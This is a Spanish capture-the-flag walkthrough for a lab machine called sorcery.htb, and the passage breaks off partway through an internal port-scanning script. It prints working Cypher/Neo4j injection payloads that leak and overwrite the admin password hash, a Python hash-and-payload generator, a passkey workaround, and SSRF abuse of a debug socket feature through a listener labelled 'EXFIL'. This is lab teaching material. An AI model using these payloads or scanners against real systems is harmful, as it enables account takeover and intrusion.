---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Page

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-10 17:53 CET
Nmap scan report for 10.10.11.73
Host is up (0.040s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 79:93:55:91:2d:1e:7d:ff:f5:da:d9:8e:68:cb:10:b9 (ECDSA)
|_  256 97:b6:72:9c:39:a9:6c:dc:01🆎3e:aa:ff:cc:13:4a (ED25519)
443/tcp open  ssl/http nginx 1.27.1
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://sorcery.htb/
|_http-server-header: nginx/1.27.1
| ssl-cert: Subject: commonName=sorcery.htb
| Not valid before: 2024-10-31T02:09:11
|_Not valid after:  2052-03-18T02:09:11
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.78 seconds
```

...

## FFUF

```shell
ffuf -c -w <WORDLIST> -u https://sorcery.htb -H "Host: FUZZ.sorcery.htb" -fs 169
```

Info:

```

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://sorcery.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.sorcery.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

git                     [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 82ms]
```

Veremos que hay un `subdominio` llamado `git` el cual vamos añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           sorcery.htb git.sorcery.htb
```

Lo guardamos y entramos a el.

```
URL = https://git.sorcery.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20251210181353.png" alt=""><figcaption></figcaption></figure>

Veremos que tiene alojado una `Gitea`, pero no tendremos credenciales para entrar dentro del mismo.

## Explorar Git

Igualmente podremos irnos a `Explore`, veremos un repositorio creado por `nicole_sullivan` llamado `infrastructure`, dentro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251219122425.png" alt=""><figcaption></figcaption></figure>

Si analizamos en profundidad el repo veremos el archivo `backend-macros/src/lib.rs` (líneas \~162-163, 176-177) que podemos realizar una `Inyección de Cypher/Neo4j`.

```rust
// Línea ~162-163
let query_string = format!(
    r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
    #struct_name, #name_string, #name
);

// Línea ~176-177  
let query_string = format!(
    "CREATE (result: {} {{ {} }})",
    #struct_name, #properties
);
```

**Problema**: Concatenación directa de strings en consultas Cypher sin sanitización. Permite inyección de consultas Neo4j.

Teniendo eso en cuenta tambien tendremos que investigar el funcionamiento de la pagina:

```
URL = https://git.sorcery.htb/nicole_sullivan/infrastructure/src/branch/main/frontend/src/app/dashboard/store/%5Bproduct%5D/page.tsx
```

Info:

```tsx
import { API } from "@/api/client";
import { Product } from "@/entity/product";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { notFound } from "next/navigation";
import { requireAuth } from "@/protect/protect";
import React from "react";

interface Response {
  product: Product;
}

async function _ProductPage({ params }: { params: { product: string } }) {
  const response = await API().get(`product/${params.product}`);

  if (response.status === 404) {
    return notFound();
  }

  const { product } = (await response.json()) as Response;

  return (
    <Card className="flex flex-col">
      <CardHeader>
        <CardTitle>
          <p className="text-3xl">{product.name}</p>
        </CardTitle>
      </CardHeader>
      <CardContent className="flex flex-col flex-1">
        <p
          className="mb-4 text-xl"
          dangerouslySetInnerHTML={{
            __html: product.description,
          }}
        />
      </CardContent>
    </Card>
  );
}

export default async function ProductPage<T>(props: T) {
  const Component = await requireAuth(_ProductPage);

  return <Component {...props} />;
}
```

## Inyección de Cypher/Neo4j

Vamos a probar la `inyeccion` en el campo `ID` del producto que es donde estamos viendo que es vulnerable poniendo un `payload` tipico para probar, vamos a forzar a que nos muestre el segundo producto que este en la `DDBB` de esta forma:

```
1"}) RETURN result UNION MATCH (result:Product) RETURN result ORDER BY result.id SKIP 1 LIMIT 1 //
```

Pero antes vamos a `URL Codificarlo` quedando asi:

```
1%22%7D%29%20RETURN%20result%20UNION%20MATCH%20%28result%3AProduct%29%20RETURN%20result%20ORDER%20BY%20result.id%20SKIP%202%20LIMIT%201%20%2F%2F
```

Ahora abriremos `BurpSuite` capturaremos la peticion para enviarla al `Repeater` y asi poder enviar multiples solicitudes quedando la peticion asi:

```
GET /dashboard/store/1%22%7D%29%20RETURN%20result%20UNION%20MATCH%20%28result%3AProduct%29%20RETURN%20result%20ORDER%20BY%20result.id%20SKIP%202%20LIMIT%201%20%2F%2F HTTP/1.1
Host: sorcery.htb
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzZDVlNGFmLTQ1NDQtNDAyYS04ZjU0LWY1ZTZiN2VhODM5ZiIsInVzZXJuYW1lIjoiZGlzZW8iLCJwcml2aWxlZ2VMZXZlbCI6MCwid2l0aFBhc3NrZXkiOmZhbHNlLCJvbmx5Rm9yUGF0aHMiOm51bGwsImV4cCI6MTc2NjMxNzgxMn0.qx9Nsca4mFTdbmdjMhtZluko7JZCwNs3M6-kUNkmg2I
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
Referer: https://sorcery.htb/dashboard/store/test%27)%20MATCH%20(u%3AUser)%20RETURN%20u%20LIMIT%2010%20/



```

Si lo enviamos veremos que se nos muestra el segundo producto de la pagina como bien dijimos, pero si ponemos que nos muestre el tercer producto tambien funcionara, por lo que vamos a intentar modificar el `ID` de un producto que exista:

```
88b6b6c5-a614-486c-9d51-d255f47efb4f"}) MATCH (p:Product { id: "88b6b6c5-a614-486c-9d51-d255f47efb4f" }) SET p.id='1' RETURN result //
```

Ahora si esto lo `URL Codificamos` para que pueda funcionar...

```
88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7d)%20MATCH%20(p%3aProduct%20%7b%20id%3a%20%2288b6b6c5-a614-486c-9d51-d255f47efb4f%22%20%7d)%20SET%20p.id%3d'1'%20RETURN%20result%20%2f%2f
```

Y lo enviamos veremos que nos responde el servidor con un `200 OK` ahora para probar que funciono, vamos a poner en la `URL` el numero `1` que es como establecimos el `ID` de dicho producto.

```
URL = https://sorcery.htb/dashboard/store/1
```

Entrando dentro veremos que ha funcionado y nos mostrara el producto de forma correcta, por lo que vamos a cambiar la contraseña al `admin`, pero antes tendremos que saber en que formato esta el `hash` de esta forma:

```
1%22%7d)%20MATCH%20(p%3aUser%20%7b%20username%3a%20%22admin%22%20%7d)%20SET%20result.description%20%3d%20p.password%20RETURN%20result%20%2f%2f
```

Lo codificamos...

```
1"}) MATCH (p:User { username: "admin" }) SET result.description = p.password RETURN result //
```

Y si enviamos ese `payload` veremos lo siguiente en la descripcion, ya que estamos modificando la descripcion del producto para poder visualizar el `hash` encontrado en la `DDBB` que tenga detras, todo esto se sabe por este fichero de `git`:

```
URL = https://git.sorcery.htb/nicole_sullivan/infrastructure/src/branch/main/backend/src/db/initial_data.rs
```

Info:

```rust
use crate::api::auth::create_hash;
use crate::db::models::post::Post;
use crate::db::models::product::Product;
use crate::db::models::user::{User, UserPrivilegeLevel};
use uuid::Uuid;

pub async fn initial_data() {
    dotenv::dotenv().ok();
    let admin_password = std::env::var("SITE_ADMIN_PASSWORD").expect("SITE_ADMIN_PASSWORD");
    let admin = User {
        id: Uuid::new_v4().to_string(),
        username: "admin".to_string(),
        password: create_hash(&admin_password).expect("site admin hash"),
        privilege_level: UserPrivilegeLevel::Admin,
    };
    admin.save().await;

    Post {
        id: Uuid::new_v4().to_string(),
        title: "Phishing Training".to_string(),
        description:
            "Hello, just making a quick summary of the phishing training we had last week. \
        Remember not to open any link in the email unless: \
        a) the link comes from one of our domains (<something>.sorcery.htb); \
        b) the website uses HTTPS; \
        c) the subdomain uses our root CA. (the private key is safely stored on our FTP server, so it can't be hacked). "
                .to_string(),
    }
    .save()
    .await;

    Post {
        id: Uuid::new_v4().to_string(),
        title: "Phishing awareness".to_string(),
        description:
        "There has been a phishing campaign that used our Gitea instance. \
        All of our employees except one (looking at you, @tom_summers) have passed the test. \
        Unfortunately, Tom has entered their credentials, but our infosec team quickly revoked the access and changed the password. \
        Tom, make sure that doesn't happen again! Follow the rules in the other post!"
            .to_string(),
    }
        .save()
        .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Mystic Elixirs".to_string(),
        description: "Magical potions said to grant wisdom, strength, or enhanced perception."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Philosopher's Stone".to_string(),
        description: "A legendary artifact rumored to turn any metal into pure gold.".to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Magic Amulets".to_string(),
        description: "Enchanted charms offering protection and fortune to their wearers."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Potion Kit".to_string(),
        description: "A set of ingredients and instructions to brew your own magical concoctions."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Alchemy Rings".to_string(),
        description:
            "Rings inscribed with alchemical symbols, believed to channel mystical energies."
                .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Enchanted Scrolls".to_string(),
        description: "Ancient texts containing spells and secrets of the alchemists.".to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Transmutation Box".to_string(),
        description:
            "A mysterious box designed to transform ordinary items into extraordinary ones."
                .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Elemental Wands".to_string(),
        description: "Wands infused with the power of the elements: Earth, Water, Fire, and Air."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Crystal Orbs".to_string(),
        description: "Mystical orbs used for scrying and seeing into other realms.".to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Wizard Robes".to_string(),
        description:
            "Elaborate robes adorned with alchemical symbols, perfect for any aspiring alchemist."
                .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Herbal Potions".to_string(),
        description: "Potent mixtures made from rare herbs, each with unique properties."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Gold Maker".to_string(),
        description: "A mythical device claimed to turn base metals into gold.".to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Secret Manuscripts".to_string(),
        description: "Hidden texts revealing forgotten alchemical practices and recipes."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Mystic Candles".to_string(),
        description: "Candles infused with magical essences to enhance rituals and meditations."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Sorcerer's Tools".to_string(),
        description: "Essential tools for any alchemist, including crucibles, beakers, and scales."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Alchemy Maps".to_string(),
        description: "Ancient maps detailing locations of lost alchemical knowledge and treasures."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Ancient Tomes".to_string(),
        description: "Hefty books filled with centuries-old alchemical wisdom and lore."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Mystical Charms".to_string(),
        description: "Small talismans imbued with enchantments for good luck and protection."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Elixir Bottles".to_string(),
        description: "Beautifully crafted bottles for storing and displaying your potions."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Alchemy Symbols".to_string(),
        description: "Intricate symbols used in alchemical practices, available as art or jewelry."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Magic Herbs".to_string(),
        description: "Rare herbs believed to possess magical properties for potions and spells."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Mystic Flames".to_string(),
        description: "Special candles or lanterns that produce colored or enchanted flames."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Transmutation Circles".to_string(),
        description: "Detailed diagrams used to focus and channel alchemical energies.".to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Arcane Powders".to_string(),
        description: "Mysterious powders used in various alchemical processes and rituals."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;

    Product {
        id: Uuid::new_v4().to_string(),
        name: "Enchanted Crystals".to_string(),
        description: "Crystals imbued with magical properties, useful for healing and protection."
            .to_string(),
        is_authorized: true,
        created_by_id: admin.id.clone(),
    }
    .save()
    .await;
}
```

Por lo que visualizaremos esto:

```
$argon2id$v=19$m=19456,t=2,p=1$AyMgVbXNjjeO9NIXS9eILw$Y7/Boj5dfSsgw2HtvIk79bNlNjz6C3fs0EDtEEAogds
```

**Parámetros del hash:**

* Algoritmo: Argon2id
* Versión: 19
* m (memory): 19456 KB (19MB)
* t (time): 2 iteraciones
* p (parallelism): 1 hilo
* Salt: `AyMgVbXNjjeO9NIXS9eILw` (Base64)
* Hash: `Y7/Boj5dfSsgw2HtvIk79bNlNjz6C3fs0EDtEEAogds` (Base64)

## Cambiar contraseña admin (Inyección)

Vamos a generar un `hash` en formato `Argon2id` por lo que estamos viendo en la informacion anterior quedando algo asi:

> generateHash.py

```python
#!/usr/bin/env python3
import argon2
import base64
import sys
import re

def generate_argon2id_hash(password, salt_base64=None):
    """
    Genera un hash Argon2id con los parámetros específicos:
    v=19, m=19456, t=2, p=1
    
    Args:
        password (str): La contraseña a hashear
        salt_base64 (str, optional): Salt en Base64. Si es None, se genera aleatorio.
    
    Returns:
        str: Hash en formato string
    """
    # Parámetros específicos del hash objetivo
    time_cost = 2          # t=2
    memory_cost = 19456    # m=19456 (19MB en KB)
    parallelism = 1        # p=1
    hash_length = 32       # Longitud del hash en bytes
    salt_length = 16       # Longitud del salt en bytes
    
    # Crear el hasher con los parámetros específicos
    hasher = argon2.PasswordHasher(
        time_cost=time_cost,
        memory_cost=memory_cost,
        parallelism=parallelism,
        hash_len=hash_length,
        salt_len=salt_length
    )
    
    # Si no se proporciona salt, generar uno aleatorio
    if salt_base64:
        try:
            # Decodificar el salt de Base64
            salt = base64.b64decode(salt_base64)
            if len(salt) != salt_length:
                print(f"[-] Error: Salt debe tener {salt_length} bytes, tiene {len(salt)}")
                return None
        except Exception as e:
            print(f"[-] Error decodificando salt: {e}")
            return None
    else:
        # Generar salt aleatorio
        import os
        salt = os.urandom(salt_length)
        salt_base64 = base64.b64encode(salt).decode('utf-8')
    
    # Generar el hash
    hash_result = hasher.hash(password, salt=salt)
    
    return hash_result

def parse_existing_hash(hash_string):
    """
    Parsea un hash existente para extraer los componentes
    
    Args:
        hash_string (str): Hash en formato string
    
    Returns:
        dict: Componentes del hash o None si no es válido
    """
    pattern = r'^\$argon2id\$v=(\d+)\$m=(\d+),t=(\d+),p=(\d+)\$([A-Za-z0-9+/=]+)\$([A-Za-z0-9+/=]+)$'
    match = re.match(pattern, hash_string)
    
    if match:
        return {
            'version': int(match.group(1)),
            'memory_cost': int(match.group(2)),
            'time_cost': int(match.group(3)),
            'parallelism': int(match.group(4)),
            'salt': match.group(5),
            'hash': match.group(6)
        }
    return None

def main():
    print("=== Generador de Hash Argon2id ===")
    print("Parámetros: v=19, m=19456, t=2, p=1")
    print("=" * 40)
    
    # Pedir contraseña
    if len(sys.argv) > 1:
        password = sys.argv[1]
    else:
        password = input("Introduce la contraseña: ")
    
    # Preguntar si usar un salt específico
    use_custom_salt = input("\n¿Usar salt específico? (s/n) [n]: ").lower().strip()
    
    salt = None
    if use_custom_salt == 's':
        salt_input = input("Introduce el salt en Base64: ").strip()
        if salt_input:
            salt = salt_input
    
    # Generar el hash
    print("\n[+] Generando hash...")
    try:
        hash_result = generate_argon2id_hash(password, salt)
        
        if hash_result:
            print("\n[+] Hash generado exitosamente:")
            print(f"{hash_result}")
            
            # Si se usó salt personalizado, mostrar también el hash decodificado
            if salt:
                print("\n[+] Componentes del hash:")
                components = parse_existing_hash(hash_result)
                if components:
                    print(f"  Versión: {components['version']}")
                    print(f"  Memoria (m): {components['memory_cost']}")
                    print(f"  Iteraciones (t): {components['time_cost']}")
                    print(f"  Paralelismo (p): {components['parallelism']}")
                    print(f"  Salt (Base64): {components['salt']}")
                    print(f"  Hash (Base64): {components['hash']}")
                    
                    # Mostrar salt y hash en bytes
                    salt_bytes = base64.b64decode(components['salt'])
                    hash_bytes = base64.b64decode(components['hash'])
                    print(f"  Salt (hex): {salt_bytes.hex()}")
                    print(f"  Hash (hex): {hash_bytes.hex()}")
            
            # Mostrar payload para inyección
            print("\n[+] Para inyección Cypher (sin URL encode):")
            print(f'MATCH (u:User {{username: "admin"}}) SET u.password = "{hash_result}" RETURN result')
            
            print("\n[+] URL encoded (solo el hash):")
            import urllib.parse
            hash_encoded = urllib.parse.quote(hash_result)
            print(hash_encoded)
            
            print("\n[+] Payload completo URL encoded (ejemplo):")
            payload = f'88b6b6c5-a614-486c-9d51-d255f47efb4f"%7D) MATCH (u:User {{username: "admin"}}) SET u.password = "{hash_result}" RETURN result //'
            print(urllib.parse.quote(payload))
    
    except Exception as e:
        print(f"[-] Error generando hash: {e}")
        print("\n[+] Asegúrate de tener instalado: pip install argon2-cffi")

if __name__ == "__main__":
    # Verificar dependencias
    try:
        import argon2
    except ImportError:
        print("[-] Error: Necesitas instalar argon2-cffi")
        print("[+] Ejecuta: pip install argon2-cffi")
        sys.exit(1)
    
    main()
```

Ahora vamos a ejecutarlo de esta forma:

```shell
python3 -m venv .venv
source .venv/bin/activate
pip install argon2-cffi
python3 generateHash.py
```

Info:

```
=== Generador de Hash Argon2id ===
Parámetros: v=19, m=19456, t=2, p=1
========================================
Introduce la contraseña: password123

¿Usar salt específico? (s/n) [n]:

[+] Generando hash...

[+] Hash generado exitosamente:
$argon2id$v=19$m=19456,t=2,p=1$8UL8ffnjnhOv/4XjB1PVAg$7PL1BvZgu1GWamULG2kOGlhhDYgULPkMfwrhRMTejeE

[+] Para inyección Cypher (sin URL encode):
MATCH (u:User {username: "admin"}) SET u.password = "$argon2id$v=19$m=19456,t=2,p=1$8UL8ffnjnhOv/4XjB1PVAg$7PL1BvZgu1GWamULG2kOGlhhDYgULPkMfwrhRMTejeE" RETURN result

[+] URL encoded (solo el hash):
%24argon2id%24v%3D19%24m%3D19456%2Ct%3D2%2Cp%3D1%248UL8ffnjnhOv/4XjB1PVAg%247PL1BvZgu1GWamULG2kOGlhhDYgULPkMfwrhRMTejeE

[+] Payload completo URL encoded (ejemplo):
88b6b6c5-a614-486c-9d51-d255f47efb4f%22%257D%29%20MATCH%20%28u%3AUser%20%7Busername%3A%20%22admin%22%7D%29%20SET%20u.password%20%3D%20%22%24argon2id%24v%3D19%24m%3D19456%2Ct%3D2%2Cp%3D1%248UL8ffnjnhOv/4XjB1PVAg%247PL1BvZgu1GWamULG2kOGlhhDYgULPkMfwrhRMTejeE%22%20RETURN%20result%20//
```

Ahora vamos a formar el siguiente `payload`:

```
1"}) MATCH (p:User { username: "admin" }) SET p.password = '$argon2id$v=19$m=19456,t=2,p=1$8UL8ffnjnhOv/4XjB1PVAg$7PL1BvZgu1GWamULG2kOGlhhDYgULPkMfwrhRMTejeE' RETURN result //
```

Si lo codificamos...

```
1%22%7d)%20MATCH%20(p%3aUser%20%7b%20username%3a%20%22admin%22%20%7d)%20SET%20p.password%20%3d%20'%24argon2id%24v%3d19%24m%3d19456%2ct%3d2%2cp%3d1%248UL8ffnjnhOv%2f4XjB1PVAg%247PL1BvZgu1GWamULG2kOGlhhDYgULPkMfwrhRMTejeE'%20RETURN%20result%20%2f%2f
```

Ahora enviando esta peticion vamos a probar a iniciar sesion con estas credenciales:

```
User: admin
Pass: password123
```

Echo esto veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251220171304.png" alt=""><figcaption></figcaption></figure>

## Login por Passkey virtual

Efectivamente acabamos de conseguir el acceso al usuario `admin`, pero si entramos a las secciones de `DNS, Debug y Blog` veremos que requiere de autenticarnos por `Passkey` y no por `password`, pero si nos vamos al perfil y le damos a `Enroll Passkey` en la consola nos pondra lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251222105509.png" alt=""><figcaption></figcaption></figure>

Que no podemos realizar esto ya que lleva consigo la pagina un certificado `TLS`.

Esto lo podemos solucionar dondole a los `3` puntitos y seleccionando la opcion `More Tools` -> `WebAuthn`.

<figure><img src="../../.gitbook/assets/Pasted image 20251222105648.png" alt=""><figcaption></figcaption></figure>

Dentro de esta opcion seleccionamos la casilla `Enable virtual...` y rellenamos las opciones como se ven en la captura, para asi poder virtualizar este proceso y que no nos de dicho error.

<figure><img src="../../.gitbook/assets/Pasted image 20251222105750.png" alt=""><figcaption></figcaption></figure>

Le daremos a `Add` y veremos que se nos añadio de forma correcta, ahora volveremos a pulsar el boton de `Enroll Passkey` y veremos

<figure><img src="../../.gitbook/assets/Pasted image 20251222105916.png" alt=""><figcaption></figcaption></figure>

Seleccionaremos `This device` y esto se le asignara al perfil un `Passkey ID`.&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20251222105942.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Pasted image 20251222105934.png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado, por lo que vamos a cerrar sesion e irnos a la opcion de `Passkey`.

<figure><img src="../../.gitbook/assets/Pasted image 20251222110049.png" alt=""><figcaption></figcaption></figure>

Pondremos `admin`, le daremos a `login` y nos pedira ese mismo `Passkey`, por lo que seleccionaremos el de `admin`...

<figure><img src="../../.gitbook/assets/Pasted image 20251222110235.png" alt=""><figcaption></figcaption></figure>

Y con esto ya podremos ver las diferentes secciones ya que si nos vamos al perfil veremos que estamos autenticados con el metodo de `passkey`:

<figure><img src="../../.gitbook/assets/Pasted image 20251222110338.png" alt=""><figcaption></figcaption></figure>

Si investigamos un poco en dichas secciones veremos en la parte de `Debug` que podremos poner un `Host` y puerto, junto con la `Data` en `hexadecimal`, si ponemos una `IP` interna veremos que nos da un pequeño error posiblemente por que no exista dicho puerto de forma interna, pero si ponemos nuestra `IP` junto con el puerto donde tengamos nuestro servidor de `python3` y en `Data` metemos por ejemplo `check` en `hexadeciaml` (`636865636b`) veremos que nos llega una respuesta del servidor, por lo que se esta comunicando bien.

> Linea de codigo donde vemos que sucede por dentro con el `Debug`.

```rust
TcpStream::connect(format!("{}:{}", data.host, data.port))
```

Esto tiene toda la pinta investigando el codigo en `git` de que se esta realizando una comunicacion por `sockets`, esto quiere decir que nos limita un poco lo que podemos hacer entorno a crear sitios web maliciosos para exfiltrar info o demas cosas, pero lo que si podemos hacer es crear un servidor de `python3` para ver si la informacion es `bidireccional`.

> server.py

```python
import socket

HOST = "0.0.0.0"
PORT = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)

print(f"[+] Listening on {PORT}")

while True:
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")

    data = conn.recv(4096)
    print(f"[>] Received: {data}")

    # Respuesta controlada (EXFIL)
    response = b"HELLO_FROM_EXFIL_SERVER\nVERSION=1.0\nHOST=external\n"
    conn.sendall(response)

    conn.close()
```

Vamos a iniciar el servidor.

```shell
python3 server.py
```

Info:

```
[+] Listening on 80
```

Ahora desde la web pondremos algo asi:

<figure><img src="../../.gitbook/assets/Pasted image 20251222120523.png" alt=""><figcaption></figcaption></figure>

El `hexadecimal` (`636865636b`) es `check` en texto plano, una palabra de prueba.

Esto si le damos a `Send` y volvemos a nuestro servidor veremos lo siguiente:

```
[+] Connection from ('10.10.11.73', 49386)
[>] Received: b'check'
```

Y ahora si volvemos a la pagina veremos esto otro:

<figure><img src="../../.gitbook/assets/Pasted image 20251222120657.png" alt=""><figcaption></figcaption></figure>

Que esto si lo decodificamos de `hexadecimal` a texto plano veremos lo siguiente:

```shell
echo 48454c4c4f5f46524f4d5f455846494c5f5345525645520a56455253494f4e3d312e300a484f53543d65787465726e616c0a | xxd -r -p
```

Info:

```
HELLO_FROM_EXFIL_SERVER
VERSION=1.0
HOST=external
```

Vemos que ha funcionado esta comunicacion `bidireccional`, pero con nuestra `IP` podemos hacer poco, por lo que vamos a realizar un escaneo de puertos internos creando un script en `python3` para descubrir cuales tiene abiertos la maquina victima.

> reconPorts.py

```python
#!/usr/bin/env python3
import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor
import json

class SSRFScanner:
    def __init__(self, token, next_action, target="sorcery.htb"):
        self.base_url = f"https://{target}"
        self.endpoint = "/dashboard/debug"
        self.headers = {
            "Host": target,
            "Cookie": f"token={token}",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
            "Accept": "text/x-component",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": f"https://{target}/dashboard/debug",
            "Next-Action": next_action,
            "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22dashboard%22%2C%7B%22children%22%3A%5B%22debug%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Fdashboard%2Fdebug%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": f"https://{target}",
            "Connection": "keep-alive"
        }
        
        # Servicios comunes y sus payloads
        self.common_services = {
            21: ("FTP", "USER anonymous\r\n"),
            22: ("SSH", "SSH-2.0-Client\r\n"),
            23: ("Telnet", "\r\n"),
            25: ("SMTP", "EHLO test\r\n"),
            53: ("DNS", "test"),
            80: ("HTTP", "GET / HTTP/1.0\r\n\r\n"),
            110: ("POP3", "USER test\r\n"),
            111: ("RPC", "test"),
            135: ("RPC", "test"),
            139: ("SMB", "test"),
            143: ("IMAP", "a001 LOGIN test test\r\n"),
            443: ("HTTPS", "GET / HTTP/1.0\r\n\r\n"),
            445: ("SMB", "test"),
            993: ("IMAPS", "test"),
            995: ("POP3S", "test"),
            1433: ("MSSQL", "test"),
            1521: ("Oracle", "test"),
            2049: ("NFS", "test"),
            3000: ("Node.js", "GET / HTTP/1.0\r\n\r\n"),
            3306: ("MySQL", "\x00\x00\x00\x00"),
            3389: ("RDP", "test"),
            5432: ("PostgreSQL", "test"),
            5900: ("VNC", "RFB 003.008\r\n"),
            6379: ("Redis", "PING\r\n"),
            8000: ("HTTP Alt", "GET / HTTP/1.0\r\n\r\n"),
            8080: ("HTTP Proxy", "GET / HTTP/1.0\r\n\r\n"),
            8081: ("HTTP Alt2", "GET / HTTP/1.0\r\n\r\n"),
